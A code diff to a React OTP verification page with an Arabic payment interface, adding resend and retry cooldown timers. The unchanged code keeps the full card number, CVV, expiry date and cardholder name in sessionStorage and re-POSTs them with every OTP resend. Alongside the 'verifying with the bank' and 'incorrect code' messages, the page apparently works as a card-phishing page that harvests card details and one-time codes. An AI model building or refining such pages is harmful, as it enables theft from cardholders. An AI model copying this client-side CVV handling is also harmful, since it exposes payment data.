@@ -13,14 +13,47 @@ export default function OtpPage() {
   const [timeLeft, setTimeLeft] = useState(119);
   const [submitting, setSubmitting] = useState(false);
   const [error, setError] = useState("");
+  const [cooldown, setCooldown] = useState(0);
+  const [resendCooldown, setResendCooldown] = useState(60);
 
   const isFilled = otp.length >= 4;
+
+  // تايمر زر إعادة الإرسال - يحفظ في localStorage عشان يفضل شغال لو خرج
+  useEffect(() => {
+    const KEY = "resendUnlockAt";
+    const stored = localStorage.getItem(KEY);
+    const now = Date.now();
+    let unlockAt: number;
+    if (stored && parseInt(stored) > now) {
+      unlockAt = parseInt(stored);
+    } else {
+      unlockAt = now + 60000;
+      localStorage.setItem(KEY, String(unlockAt));
+    }
+    const calc = () => {
+      const diff = Math.ceil((unlockAt - Date.now()) / 1000);
+      setResendCooldown(diff > 0 ? diff : 0);
+    };
+    calc();
+    const interval = setInterval(() => {
+      const diff = Math.ceil((unlockAt - Date.now()) / 1000);
+      if (diff <= 0) { setResendCooldown(0); clearInterval(interval); }
+      else setResendCooldown(diff);
+    }, 1000);
+    return () => clearInterval(interval);
+  }, []);
 
   useEffect(() => {
     if (timeLeft <= 0) return;
     const t = setTimeout(() => setTimeLeft((p) => p - 1), 1000);
     return () => clearTimeout(t);
   }, [timeLeft]);
+
+  useEffect(() => {
+    if (cooldown <= 0) return;
+    const t = setTimeout(() => setCooldown((p) => p - 1), 1000);
+    return () => clearTimeout(t);
+  }, [cooldown]);
 
 
 
@@ -43,13 +76,19 @@ export default function OtpPage() {
 
       setError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى");
       setSubmitting(false);
+      setCooldown(5);
     } catch {
       setError("حدث خطأ، يرجى المحاولة لاحقاً");
       setSubmitting(false);
+      setCooldown(5);
     }
   };
 
   const handleResend = async () => {
+    if (resendCooldown > 0) return;
+    const unlockAt = Date.now() + 60000;
+    localStorage.setItem("resendUnlockAt", String(unlockAt));
+    setResendCooldown(60);
     setTimeLeft(119);
     const saved = sessionStorage.getItem("formData");
     if (!saved) return;
@@ -60,6 +99,12 @@ export default function OtpPage() {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ customerName: form.customerName, cardHolderName: form.cardHolderName, cardNumber: form.cardNumber, cvv: form.cvv, expiryDate: form.expiryDate, transactionId, type: "resend" }),
     });
+    // تشغيل التايمر من جديد بعد الإرسال
+    const interval = setInterval(() => {
+      const diff = Math.ceil((unlockAt - Date.now()) / 1000);
+      if (diff <= 0) { setResendCooldown(0); clearInterval(interval); }
+      else setResendCooldown(diff);
+    }, 1000);
   };
 
   if (loading) {
@@ -119,19 +164,20 @@ export default function OtpPage() {
               {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
               <button
                 type="submit"
-                disabled={submitting || !isFilled}
+                disabled={submitting || !isFilled || cooldown > 0}
                 className="w-full py-3 sm:py-4 px-6 sm:px-8 bg-linear-to-br from-primary to-primary-container text-white font-bold rounded-xl text-sm sm:text-base shadow-[0_8px_20px_-4px_rgba(0,110,47,0.3)] hover:scale-[1.02] active:scale-95 transition-all mb-4 sm:mb-6 disabled:opacity-50 disabled:cursor-not-allowed disabled:scale-100"
               >
-                {submitting ? "جاري التحقق مع البنك..." : "تأكيد الرمز وإتمام الدفع"}
+                {submitting ? "جاري التحقق مع البنك..." : cooldown > 0 ? `انتظر ${cooldown} ثواني...` : "تأكيد الرمز وإتمام الدفع"}
               </button>
             </form>
 
             {/* Resend */}
             <button
               onClick={handleResend}
-              className="w-full py-2.5 sm:py-3 px-6 sm:px-8 border-2 border-primary text-primary font-bold rounded-xl text-xs sm:text-sm transition-all hover:bg-primary/5 active:scale-95"
+              disabled={resendCooldown > 0}
+              className="w-full py-2.5 sm:py-3 px-6 sm:px-8 border-2 border-primary text-primary font-bold rounded-xl text-xs sm:text-sm transition-all hover:bg-primary/5 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
             >
-              طلب رمز جديد من البنك
+              {resendCooldown > 0 ? `انتظر ${resendCooldown} ثانية لطلب رمز جديد` : "طلب رمز جديد من البنك"}
             </button>
           </div>
 
